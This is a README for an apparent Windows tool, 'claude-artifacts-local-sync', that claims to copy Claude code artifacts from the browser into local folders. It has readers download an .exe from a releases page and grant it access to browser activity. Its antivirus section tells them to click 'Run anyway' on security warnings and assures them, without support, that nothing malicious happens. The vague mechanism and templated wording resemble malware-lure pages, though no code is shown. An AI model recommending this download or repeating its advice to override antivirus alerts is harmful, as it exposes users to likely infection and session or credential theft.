# 📂 claude-artifacts-local-sync - Save Claude code directly to folders

[![Download the Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/zerooo002/claude-artifacts-local-sync/releases)

This software links your browser session with Claude to your local computer folders. It detects code blocks inside your web browser and creates matching files on your hard drive. You no longer need to copy and paste code manually. The tool keeps your local project updated every time you make changes in the Claude interface.

## ⚙️ Requirements

Ensure your computer meets these needs before you begin:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4 gigabytes of RAM.
*   Storage: 100 megabytes of free disk space.
*   Browser: Google Chrome, Microsoft Edge, or Brave.
*   Network: A stable internet connection.

## 📥 How to Install

1.  Visit the [official releases page](https://github.com/zerooo002/claude-artifacts-local-sync/releases) to download the latest version.
2.  Look for the file ending in `.exe` under the Assets section of the newest release.
3.  Click the file to start the download to your computer.
4.  Open your Downloads folder and double-click the downloaded file.
5.  Follow the prompts on your screen to complete the installation.
6.  The application creates a shortcut on your desktop once the process finishes.

## 🛠️ Setting Up Your Workspace

The software requires a target location to store your files. Follow these steps to prepare your computer.

1.  Create a new folder on your computer named "ClaudeProjects".
2.  Open the claude-artifacts-local-sync application from your desktop shortcut.
3.  The app will ask you to choose a workspace directory. Select the "ClaudeProjects" folder you created.
4.  Once selected, the software displays a status icon showing "Ready".

## 🚀 Connecting to Claude

For the software to see your files, you must grant it access to your browser activity.

1.  Open your preferred web browser.
2.  Navigate to the Claude website and log in to your account.
3.  Start a new chat or continue an existing project that contains code artifacts.
4.  Keep the browser tab open while you work.
5.  The synchronization module runs in the background. It detects new code artifacts as soon as Claude generates them.
6.  Check your "ClaudeProjects" folder. You see your generated code files appear here within seconds.

## 📋 Features

*   Automatic File Creation: The system builds file structures from scratch based on Claude's output.
*   Live Updates: Any edits you make in the chat window update the corresponding file on your computer automatically.
*   Conflict Resolution: The app adds a timestamp to your files if you rename or move them, preventing data loss.
*   Support for Many Languages: It saves files correctly regardless of the programming language Claude uses.
*   Silent Operation: The program minimizes to your system tray, keeping your workspace clean.

## 🔍 Troubleshooting Common Issues

If the software does not save files as expected, follow these steps to fix the problem.

### The application does not detect code
Check that your browser is active and open on the Claude website. The software needs an active browser window to listen for incoming data. Close the app and restart it if the connection appears stuck.

### Files show errors
Try to restart the sync process. Click the application icon in your system tray and select "Refresh Connection." This forces a new link between the browser and the local folder.

### Permission issues
Ensure that your "ClaudeProjects" folder is not set to "Read Only." Right-click your folder, select Properties, and ensure the Read-only box is unchecked.

### Antivirus alerts
Some security software may flag new programs. Click "Run anyway" if your security software asks for permission to launch the file. This program does not share your data or perform malicious actions.

## 🔒 Data Privacy

This application processes data locally on your machine. The software extracts code from the web interface and writes it directly to your hard drive. It does not send your code or personal information to any third-party servers. Your work stays on your computer.

## 📝 Tips for Successful Syncing

*   Name your artifacts clearly inside the Claude chat. The tool uses these names for your local files.
*   Keep your project folders organized. Create sub-folders for different sessions to prevent naming collisions.
*   Close the sync app when you finish your work to save system resources.
*   Update the software regularly. Check the [releases page](https://github.com/zerooo002/claude-artifacts-local-sync/releases) every few weeks for improvements and fixes.

## 🎓 Understanding the Workflow

When you generate code through Claude, the system creates a container for your project. Our software identifies this container. It translates the information inside the container into usable files. If you change a component in the chat, the tool identifies the specific change and writes those lines to the disk. This creates a seamless flow from the web interface to your editing environment. 

You no longer need to worry about losing code when you refresh your browser. The local copy acts as a backup system. You can open these files in any text editor or integrated development environment once the sync finishes. This adds a layer of reliability to your development process. 

Using this tool improves your productivity by removing the manual steps between generating ideas and testing them. You maintain full control over the file structure on your computer. Use this setup to build prototypes, document project logic, or save code snippets for future use without the overhead of manual file management.